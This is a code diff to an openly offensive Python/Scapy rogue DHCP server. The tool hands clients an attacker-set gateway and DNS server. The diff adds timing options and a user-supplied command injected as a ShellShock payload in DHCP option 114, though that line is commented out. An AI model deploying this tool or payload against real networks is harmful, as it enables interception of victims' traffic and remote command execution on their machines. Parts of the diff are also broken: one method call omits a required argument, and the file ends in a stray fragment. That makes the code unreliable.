@@ -35,6 +35,11 @@ class DHCPListener:
     __fakeSubnetMask: str
     __fakeGatewayIP: str
     __leaseTime: int
+    __renewalTime: int
+    __rebindingTime: int
+
+    # ShellShock
+    _command: str
 
     def __init__(self):
         self.__GATEWAY_IP = conf.route.route("0.0.0.0")[2]
@@ -49,6 +54,20 @@ class DHCPListener:
         self.__fakeSubnetMask = ""
         self.__fakeGatewayIP = self.__DHCPServerIp
         self.__leaseTime = 86400
+        self.__renewalTime = 172800
+        self.__rebindingTime = 138240
+
+        self.__command = "echo nullp"
+
+
+    def setLeaseTime(self, leaseTime):
+        self.__leaseTime = leaseTime
+
+    def setRenewalTime(self, renewalTime):
+        self.__renewalTime = renewalTime
+
+    def setRebindingTime(self, rebindingTime):
+        self.__rebindingTime = rebindingTime
 
     def setDNS(self, dns):
         self.__fakeDNSServer = dns
@@ -61,6 +80,9 @@ class DHCPListener:
 
     def setIPPool(self, IPPool):
         self.__IPPool = self.getIPPoolbyRange(IPPool)
+
+    def setCommand(self, command):
+        self.__command = command
 
     # Return a list of IP address given a range
     def getIPPoolbyRange(self, iprange):
@@ -112,8 +134,8 @@ class DHCPListener:
         except:
             pass
 
-    # return a DHCP packet for the client discovery or request. Type could be offer or ack
-    def generatePacketServer(self, type, IPClient, packet):
+    # return a DHCP packet for the client discovery
+    def generatePacketServerOffer(self, type, IPClient, packet, command):
         return (Ether(src=self.__DHCPMac, dst=packet[Ether].src) /
                 IP(src=self.__DHCPServerIp, dst="255.255.255.255") /
                 UDP(sport=67, dport=68) /
@@ -125,11 +147,37 @@ class DHCPListener:
                       xid=packet[BOOTP].xid) /
                 DHCP(options=[
                     ('server_id', self.__DHCPServerIp),
-                    ("lease_time", 86400),  # 1 day
+                    ("lease_time", self.__leaseTime), 
+                    ('renewal_time', self.__renewalTime),
+                    ('rebinding_time', self.__rebindingTime),
                     ('subnet_mask', self.__fakeSubnetMask),
                     ('router', self.__fakeGatewayIP),
                     ('message-type', type),
                     ("name_server", self.__fakeDNSServer),
+                    'end']
+                ))
+
+    # return a DHCP packet for the client request. 
+    def generatePacketServerACK(self, type, IPClient, packet):
+        return (Ether(src=self.__DHCPMac, dst=packet[Ether].src) /
+                IP(src=self.__DHCPServerIp, dst="255.255.255.255") /
+                UDP(sport=67, dport=68) /
+                BOOTP(op=2,
+                      yiaddr=IPClient,
+                      ciaddr=packet[IP].src,
+                      siaddr=self.__DHCPServerIp,
+                      chaddr=packet[Ether].chaddr,
+                      xid=packet[BOOTP].xid) /
+                DHCP(options=[
+                    ('server_id', self.__DHCPServerIp),
+                    ("lease_time", self.__leaseTime), 
+                    ('renewal_time', self.__renewalTime),
+                    ('rebinding_time', self.__rebindingTime),
+                    ('subnet_mask', self.__fakeSubnetMask),
+                    ('router', self.__fakeGatewayIP),
+                    ('message-type', type),
+                    ("name_server", self.__fakeDNSServer),
+                    #(114, "() { ignored;}; " + self.__command),
                     'end']
                 ))
 
@@ -140,7 +188,7 @@ class DHCPListener:
             # send DHCP offer
             if len(self.__IPPool) > 0:
                 IPClient = self.__IPPool.pop()
-                offer = self.generatePacketServer("offer", IPClient, packet)
+                offer = self.generatePacketServerOffer("offer", IPClient, packet)
                 sendp(offer)
 
             print(f'{bcolors.OKBLUE}---New DHCP Discover---{bcolors.ENDC}')
@@ -151,7 +199,7 @@ class DHCPListener:
         if DHCP in packet and packet[DHCP].options[0][1] == 3:
             # send DHCP ack
             requestedIP = self.getOption(packet[DHCP].options, 'requested_addr')
-            ack = self.generatePacketServer("ack", requestedIP, packet)
+            ack = self.generatePacketServerACK("ack", requestedIP, packet)
             sendp(ack)
 
             print(f"{bcolors.OKBLUE}---New DHCP Request---{bcolors.ENDC}")
@@ -159,19 +207,10 @@ class DHCPListener:
             print(f"{bcolors.FAIL}[*]{bcolors.ENDC} Device {bcolors.WARNING}{hostname}{bcolors.ENDC} ({bcolors.WARNING}{packet[Ether].src}{bcolors.ENDC}){bcolors.ENDC} requested {bcolors.WARNING}{requestedIP}\n")
             self.__dictIPS[requestedIP] = packet[Ether].src
 
-            """f = open(".dhcpusers.txt","a")
-            f.write(f"{hostname} {packet[Ether].src} {requestedIP}\r\n")
-            f.close()"""
-
-        """else:
-            print('---Other DHCP packet?---')
-            print(packet.summary())
-            print(ls(packet))
-        """
-
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="This script is a DHCP rogue server.")
+    parser.add_argument("-i", "--interface", required=False)
     parser.add_argument("-d", "--dns", required=False, help="DNS IP")
     parser.add_argument("-m", "--netmask", required=True)
     parser.add_argument("-g", "--gateway", required=False,
@@ -180,6 +219,10 @@ if __name__ == "__main__":
                              " that your DHCP server")
     parser.add_argument("-x", "--iprange", required=False,
                         help="Range IP Ex: 192.168.0.1-45 ")
+    parser.add_argument("-l", "--leasetime", required=False)
+    parser.add_argument("-r", "--renewaltime", required=False)
+    parser.add_argument("-b", "--rebindingtime", required=False)
+    parser.add_argument("-c", "--command", required=False)
     args = parser.parse_args()
 
     DHCPListener = DHCPListener()
@@ -190,12 +233,18 @@ if __name__ == "__main__":
     DHCPListener.setSubnetMask(args.netmask)
     if args.iprange is not None:
         DHCPListener.setIPPool(args.iprange)
-
-    """if os.path.exists('.dhcpusers.txt'):
-        os.remove('.dhcpusers.txt')
-    os.mknod('.dhcpusers.txt')"""
+    if args.leasetime is not None:
+        DHCPListener.setLeaseTime(args.leasetime)
+    if args.renewaltime is not None:
+        DHCPListener.setRenewalTime(args.renewaltime)
+    if args.rebindingtime is not None:
+        DHCPListener.setRebindingTime(args.rebindingtime)
+    if args.command is not None:
+        DHCPListener.setCommand(args.command)
 
     print("DHCP server in listening...")
-    sniff(filter="udp and port 67", prn=DHCPListener.listener)
+    if args.interface is None:
+        sniff(filter="udp and port 67", prn=DHCPListener.listener)
+    else:
+        sniff(iface=args.interface, filter="udp and port 67", prn=DHCPListener.listener)
 
-er="tcp and (port 80)", 
